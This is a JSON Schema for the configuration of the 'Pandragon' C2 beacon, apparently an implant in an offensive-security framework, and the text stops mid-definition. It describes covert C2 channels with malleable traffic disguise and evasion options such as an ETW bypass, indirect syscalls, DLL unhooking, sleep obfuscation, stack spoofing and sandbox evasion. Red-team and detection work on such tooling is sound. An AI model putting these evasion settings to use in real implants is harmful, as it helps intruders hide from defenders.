{
    "$schema": "http://json-schema.org/draft-07/schema#",
    "$id": "pandragon-beacon-config.json",
    "title": "Pandragon Beacon Configuration",
    "description": "Configuration schema for Pandragon C2 beacon",
    "type": "object",
    "required": ["c2_channels"],
    "properties": {
        "beacon_id": {
            "type": "string",
            "description": "8-byte beacon ID as hex string",
            "pattern": "^[0-9a-fA-F]{16}$"
        },
        "crypto_key": {
            "type": "string",
            "description": "32-byte encryption key as hex string",
            "pattern": "^[0-9a-fA-F]{64}$"
        },
        "c2_channels": {
            "type": "array",
            "description": "List of C2 communication channels",
            "minItems": 1,
            "maxItems": 4,
            "items": {
                "type": "object",
                "required": ["type", "host", "port", "poll_path", "submit_path", "user_agent", "max_consecutive_failures", "backoff_sleep_ms"],
                "properties": {
                    "type": {
                        "type": "string",
                        "enum": ["HTTP", "HTTPS", "TCP", "PIPE"],
                        "description": "Channel type (PIPE = named pipe for SMB relay)"
                    },
                    "host": {
                        "type": "string",
                        "description": "C2 server hostname",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "port": {
                        "type": "integer",
                        "description": "Server port",
                        "minimum": 1,
                        "maximum": 65535
                    },
                    "poll_path": {
                        "type": "string",
                        "description": "HTTP GET path for poll operations",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "submit_path": {
                        "type": "string",
                        "description": "HTTP POST path for submit operations",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "user_agent": {
                        "type": "string",
                        "description": "User-Agent header",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "max_consecutive_failures": {
                        "type": "integer",
                        "description": "Max consecutive failures before backoff",
                        "minimum": 1,
                        "maximum": 100
                    },
                    "backoff_sleep_ms": {
                        "type": "integer",
                        "description": "Backoff sleep duration in milliseconds",
                        "minimum": 1000,
                        "maximum": 300000
                    },
                    "poll_malleable_config": {
                        "type": "object",
                        "description": "Per-channel poll (GET) malleable config. If absent, uses global poll_malleable_config.",
                        "properties": {
                            "wrapper": {
                                "type": "object",
                                "description": "Prefix/suffix wrapper for base64url-encoded poll payloads",
                                "properties": {
                                    "prefix": {
                                        "type": "string",
                                        "description": "String to prepend to payload",
                                        "maxLength": 65535
                                    },
                                    "suffix": {
                                        "type": "string",
                                        "description": "String to append to payload",
                                        "maxLength": 65535
                                    }
                                },
                                "additionalProperties": false
                            },
                            "http_headers": {
                                "type": "array",
                                "description": "Custom HTTP headers for poll requests",
                                "maxItems": 255,
                                "items": {
                                    "type": "object",
                                    "required": ["name", "value"],
                                    "properties": {
                                        "name": {
                                            "type": "string",
                                            "description": "HTTP header name",
                                            "minLength": 1,
                                            "maxLength": 255
                                        },
                                        "value": {
                                            "type": "string",
                                            "description": "HTTP header value",
                                            "maxLength": 255
                                        }
                                    }
                                }
                            },
                            "payload_location": {
                                "type": "object",
                                "required": ["type"],
                                "description": "Where to place the (wrapped) payload in the GET request",
                                "properties": {
                                    "type": {
                                        "type": "string",
                                        "enum": ["query_param", "path"],
                                        "description": "Location type: query_param (?q=PAYLOAD) or path (/PREFIXPAYLOADSUFFIX)"
                                    },
                                    "param_name": {
                                        "type": "string",
                                        "description": "Query parameter name (for query_param type)",
                                        "maxLength": 255
                                    },
                                    "path_prefix": {
                                        "type": "string",
                                        "description": "Prefix to add before payload in path mode",
                                        "maxLength": 255
                                    },
                                    "path_suffix": {
                                        "type": "string",
                                        "description": "Suffix to add after payload in path mode (e.g., .png)",
                                        "maxLength": 255
                                    },
                                    "body_content_type": {
                                        "type": "string",
                                        "description": "Content-Type (reserved for future use with poll)",
                                        "enum": ["text/plain", "application/octet-stream"]
                                    },
                                    "cookie_name": {
                                        "type": "string",
                                        "description": "Cookie name for request-side Cookie header injection",
                                        "maxLength": 255
                                    }
                                },
                                "additionalProperties": false
                            }
                        },
                        "additionalProperties": false
                    },
                    "submit_malleable_config": {
                        "type": "object",
                        "description": "Per-channel submit (POST) malleable config. If absent, uses global submit_malleable_config.",
                        "properties": {
                            "wrapper": {
                                "type": "object",
                                "description": "Prefix/suffix wrapper for base64url-encoded submit payloads",
                                "properties": {
                                    "prefix": {
                                        "type": "string",
                                        "description": "String to prepend to payload",
                                        "maxLength": 65535
                                    },
                                    "suffix": {
                                        "type": "string",
                                        "description": "String to append to payload",
                                        "maxLength": 65535
                                    }
                                },
                                "additionalProperties": false
                            },
                            "http_headers": {
                                "type": "array",
                                "description": "Custom HTTP headers for submit requests",
                                "maxItems": 255,
                                "items": {
                                    "type": "object",
                                    "required": ["name", "value"],
                                    "properties": {
                                        "name": {
                                            "type": "string",
                                            "description": "HTTP header name",
                                            "minLength": 1,
                                            "maxLength": 255
                                        },
                                        "value": {
                                            "type": "string",
                                            "description": "HTTP header value",
                                            "maxLength": 255
                                        }
                                    }
                                }
                            },
                            "payload_location": {
                                "type": "object",
                                "required": ["type"],
                                "description": "Where to place the (wrapped) payload in the POST request",
                                "properties": {
                                    "type": {
                                        "type": "string",
                                        "enum": ["body", "query_param", "path"],
                                        "description": "Location type: body (POST data), query_param, or path"
                                    },
                                    "param_name": {
                                        "type": "string",
                                        "description": "Query parameter name (for query_param type)",
                                        "maxLength": 255
                                    },
                                    "path_prefix": {
                                        "type": "string",
                                        "description": "Prefix to add before payload in path mode",
                                        "maxLength": 255
                                    },
                                    "path_suffix": {
                                        "type": "string",
                                        "description": "Suffix to add after payload in path mode",
                                        "maxLength": 255
                                    },
                                    "body_content_type": {
                                        "type": "string",
                                        "description": "Content-Type for body mode",
                                        "enum": ["text/plain", "application/octet-stream"]
                                    },
                                    "cookie_name": {
                                        "type": "string",
                                        "description": "Cookie name for request-side Cookie header injection",
                                        "maxLength": 255
                                    }
                                },
                                "additionalProperties": false
                            }
                        },
                        "additionalProperties": false
                    },
                    "poll_response_malleable_config": {
                        "type": "object",
                        "description": "Per-channel poll response malleable config. Controls how poll responses are wrapped.",
                        "properties": {
                            "wrapper": {
                                "type": "object",
                                "description": "Prefix/suffix wrapper for poll response payloads",
                                "properties": {
                                    "prefix": {
                                        "type": "string",
                                        "description": "String to prepend to response",
                                        "maxLength": 65535
                                    },
                                    "suffix": {
                                        "type": "string",
                                        "description": "String to append to response",
                                        "maxLength": 65535
                                    }
                                },
                                "additionalProperties": false
                            },
                            "headers": {
                                "type": "object",
                                "description": "Custom HTTP headers for poll responses",
                                "patternProperties": {
                                    "^[A-Za-z0-9_-]+$": {
                                        "type": "string",
                                        "maxLength": 1024
                                    }
                                },
                                "additionalProperties": false
                            },
                            "body_template": {
                                "type": "string",
                                "description": "Poll response body template. Use {{PAYLOAD}} as placeholder.",
                                "maxLength": 65535
                            },
                            "status_code": {
                                "type": "integer",
                                "description": "HTTP response status code",
                                "minimum": 100,
                                "maximum": 599
                            },
                            "payload_location": {
                                "type": "object",
                                "description": "Poll response payload delivery method",
                                "properties": {
                                    "type": {
                                        "type": "string",
                                        "enum": ["query_param", "path", "body"],
                                        "description": "Payload location type (required for serialization)"
                                    },
                                    "cookie_name": {
                                        "type": "string",
                                        "description": "Cookie name for Set-Cookie response delivery",
                                        "maxLength": 255
                                    }
                                },
                                "additionalProperties": false
                            }
                        },
                        "additionalProperties": false
                    },
                    "submit_response_malleable_config": {
                        "type": "object",
                        "description": "Per-channel submit response malleable config. Controls how submit responses are wrapped.",
                        "properties": {
                            "wrapper": {
                                "type": "object",
                                "description": "Prefix/suffix wrapper for submit response payloads",
                                "properties": {
                                    "prefix": {
                                        "type": "string",
                                        "description": "String to prepend to response",
                                        "maxLength": 65535
                                    },
                                    "suffix": {
                                        "type": "string",
                                        "description": "String to append to response",
                                        "maxLength": 65535
                                    }
                                },
                                "additionalProperties": false
                            },
                            "headers": {
                                "type": "object",
                                "description": "Custom HTTP headers for submit responses",
                                "patternProperties": {
                                    "^[A-Za-z0-9_-]+$": {
                                        "type": "string",
                                        "maxLength": 1024
                                    }
                                },
                                "additionalProperties": false
                            },
                            "body_template": {
                                "type": "string",
                                "description": "Submit response body template. Use {{PAYLOAD}} as placeholder.",
                                "maxLength": 65535
                            },
                            "status_code": {
                                "type": "integer",
                                "description": "HTTP response status code",
                                "minimum": 100,
                                "maximum": 599
                            },
                            "payload_location": {
                                "type": "object",
                                "description": "Submit response payload delivery method",
                                "properties": {
                                    "type": {
                                        "type": "string",
                                        "enum": ["query_param", "path", "body"],
                                        "description": "Payload location type (required for serialization)"
                                    },
                                    "cookie_name": {
                                        "type": "string",
                                        "description": "Cookie name for Set-Cookie response delivery",
                                        "maxLength": 255
                                    }
                                },
                                "additionalProperties": false
                            }
                        },
                        "additionalProperties": false
                    }
                },
                "additionalProperties": false
            }
        },
        "sleep_ms": {
            "type": "integer",
            "description": "Base sleep interval in milliseconds",
            "minimum": 100,
            "maximum": 3600000
        },
        "jitter_pct": {
            "type": "integer",
            "description": "Jitter percentage (0-100)",
            "minimum": 0,
            "maximum": 100
        },
        "use_indirect_syscalls": {
            "type": "boolean",
            "description": "If true, enable indirect syscalls via HWBPs at runtime"
        },
        "indirect_syscall_pivot": {
            "type": "string",
            "description": "Custom pivot API for indirect syscalls (must start with 'Zw', no 'Nt' allowed). If not set, uses default.",
            "pattern": "^Zw[A-Za-z0-9]+$"
        },
        "lazy_checkin": {
            "type": "boolean",
            "description": "If true, defer system info check-in to a random poll within lazy_checkin_max"
        },
        "lazy_checkin_max": {
            "type": "integer",
            "description": "Maximum number of polls before check-in is guaranteed (1-255)",
            "minimum": 1,
            "maximum": 255
        },
        "lazy_unhook": {
            "type": "boolean",
            "description": "If true, unhook requied DLLs only before BOF execution (transparent). If false, never unhook."
        },
        "sleep_obfuscation": {
            "type": "string",
            "enum": ["none", "ekko", "ekko_runtime", "morpheus", "foliage"],
            "default": "none",
            "description": "Sleep obfuscation method"
        },
        "sleep_wipe_pe_headers": {
            "type": "boolean",
            "default": false,
            "description": "If true, zero out PE headers during sleep"
        },
        "sleep_stack_spoof": {
            "type": "boolean",
            "default": false,
            "description": "If true, swap NT_TIB during sleep obfuscation ROP chain"
        },
        "num_spoof_frames": {
            "type": "integer",
            "default": 6,
            "minimum": 0,
            "maximum": 65535,
            "description": "Number of fake return-address frames on the spoofed sleep stack"
        },
        "stack_spoof_chain": {
            "type": "array",
            "description": "Ordered list of module!function pairs for fake return addresses",
            "maxItems": 256,
            "items": {
                "type": "object",
                "required": ["module", "function"],
                "properties": {
                    "module": {
                        "type": "string",
                        "description": "DLL module name",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "function": {
                        "type": "string",
                        "description": "Export function name",
                        "minLength": 1,
                        "maxLength": 255
                    },
                    "offset": {
                        "type": "integer",
                        "default": 0,
                        "minimum": 0,
                        "maximum": 4294967295,
                        "description": "Explicit byte offset from function start (0 = auto-scan)"
                    }
                },
                "additionalProperties": false
            }
        },
        "kill_date": {
            "type": "string",
            "description": "Kill date in ISO format (YYYY-MM-DD)",
            "pattern": "^\\d{4}-\\d{2}-\\d{2}$"
        },
        "options": {
            "type": "object",
            "properties": {
                "sandbox_evasion": {
                    "type": "boolean"
                },
                "debug_mode": {
                    "type": "boolean"
                },
                "bypass_etw": {
                    "type": "boolean",
                    "description": "If true, enable ETW bypass via HWBP before sending checkin"
                },
                "validate_ssl": {
                    "type": "boolean",
                    "description": "If true, validate SSL certificates. If false, ignore cert errors."
                }
            },
            "additionalProperties": false
        },
        "pad": {
            "type": "boolean",
            "default": false,
            "description": "Enable PKCS#7 padding for fixed-size C2 traffic"
        },
        "pad_max": {
            "type": "integer",
            "default": 1024,
            "minimum": 0,
            "maximum": 65535,
            "description": "Maximum PKCS#7 padding length in bytes"
        },
        "max_response_size": {
            "type": "integer",
            "default": 67108864,
            "minimum": 1048576,
            "maximum": 1073741824,
            "description": "Maximum response body size in bytes (default 64MB)"
        },
        "poll_malleable_config": {
            "type": "object",
            "description": "Global poll (GET) malleable config. Used when a channel has no per-channel poll_malleable_config.",
            "properties": {
                "wrapper": {
                    "type": "object",
                    "description": "Prefix/suffix wrapper for base64url-encoded poll payloads",
                    "properties": {
                        "prefix": {
                            "type": "string",
                            "description": "String to prepend to payload",
                            "maxLength": 65535
                        },
                        "suffix": {
                            "type": "string",
                            "description": "String to append to payload",
                            "maxLength": 65535
                        }
                    },
                    "additionalProperties": false
                },
                "http_headers": {
                    "type": "array",
